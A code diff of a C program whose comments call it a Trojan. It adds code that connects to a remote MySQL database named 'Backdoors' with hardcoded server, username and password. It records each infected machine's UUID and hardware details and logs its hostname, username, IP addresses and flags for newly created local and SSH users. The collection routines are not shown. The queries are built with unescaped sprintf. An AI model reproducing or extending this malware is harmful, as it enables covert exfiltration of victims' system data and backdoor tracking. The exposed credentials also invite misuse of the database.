@@ -8,22 +8,43 @@
 #include <unistd.h>
 #include <string.h>
 #include <mysql.h>
+#include <string.h>
 
 int main()
 {
-    printf("Hi\n");
-	*MYSQL *conn;
+//Defining Device Extraction variables.  Accounted for End-of-String character.  Char length matches max length defined in the database
+	char UUID[51] = "8284246F-05X13-1945-90DD-DD6D00E95954";
+	char lshw[13001] = "";
+	char lscpu[501] = "";
+	char lsblk[3001] = "";
+	char datetime[20] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
+	
+	//Defining RunLog Extraction variables
+	char KernelVer[51] = "";
+	char Hostname[256] = "";
+	char Username[33] = "";
+	char KernelRelease[21] = "";
+	char TimeRun[20] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
+	char lsusb[101] = "";
+	char LocalIP[16] = "";
+	char ExternalIP[16] = "";
+	char GatewayIP[16] = "";
+	char NewLocalUser[2] = "";
+	char SSHserver[2] = "";
+	char NewSSHuser[2] = "";
+
+	//Defining Database variables
+	MYSQL *conn;
+	conn = mysql_init(NULL);
 	MYSQL_RES *res;
 	MYSQL_ROW row;
+	char *server = "mysqldatabase.cvnrdza49fyl.us-east-2.rds.amazonaws.com";
+	char *user = "Farrington";
+	char *password = "ClaySiltSand";
+	char *database = "Backdoors";
+	char prepairedStatement [16600] = "";
  
-	char *server = "";
-	char *user = "";
-	char *password = "";
-	char *database = "";
- 
-	conn = mysql_init(NULL);
- 
-	//Making connection to database
+	//Making the connection to the database
 	if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0))
 	{
 	 	printf("Connection Failed... Error: %s\n", mysql_error(conn));
@@ -31,17 +52,46 @@ int main()
 	}
  	else
  	{
- 		printf("IT WORKED");
+ 		printf("Connection Sucessful\n");
+	} 	
+
+ 	//Finding if this is the first time the Trojan ran on this machine
+ 	mysql_query(conn, "SELECT UUID FROM Device");
+ 	res = mysql_use_result(conn);
+ 	char UUIDs[51];	//temp for checking UUID values
+ 	int duplicate = 0;	//1 = duplicate
+ 	while ((row = mysql_fetch_row(res)) != NULL)
+	{
+		strncpy(UUIDs, row[0], 50);
+		if(strncmp(UUIDs, UUID, 50) == 0)
+		{
+			printf("COPY DETECTED\n");
+			duplicate = 1;
+		}	
+		//printf("%s \n", UUIDs);
 	}
 	
-	//Test Query
-	mysql_query(conn, "show databases");
-	res = mysql_use_result(conn);
-	
-	printf("Table:\n");
-	while ((row = mysql_fetch_row(res)) != NULL)
+	//If this is the first time this PC ran this trojan, log Device info
+	if (duplicate == 0)
 	{
-		printf("%s \n", row[0]);	
+		//Creating the prepaired statement
+		sprintf(prepairedStatement, "INSERT INTO Device VALUES ('%s','%s','%s','%s','%s')", UUID, lshw, lscpu, lsblk, datetime);
+		//printf("%s", prepairedStatement);
+		
+		//Runs the INSERT query to Device Table
+		if(mysql_query(conn, prepairedStatement) != 0)
+		{
+			printf("Query Failed.  Error: %s\n", mysql_error(conn));
+		}
+	}
+	
+	//RunLog INSERT
+	sprintf(prepairedStatement, "INSERT INTO RunLog VALUES (0,'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", UUID,KernelVer,Hostname,Username,KernelRelease,TimeRun,lsusb,LocalIP,ExternalIP,GatewayIP,NewLocalUser,SSHserver,NewSSHuser);
+
+	//Runs the INSERT query to RunLog Table
+	if(mysql_query(conn, prepairedStatement) != 0)
+	{
+		printf("Query Failed.  Error: %s\n", mysql_error(conn));
 	}
 
 
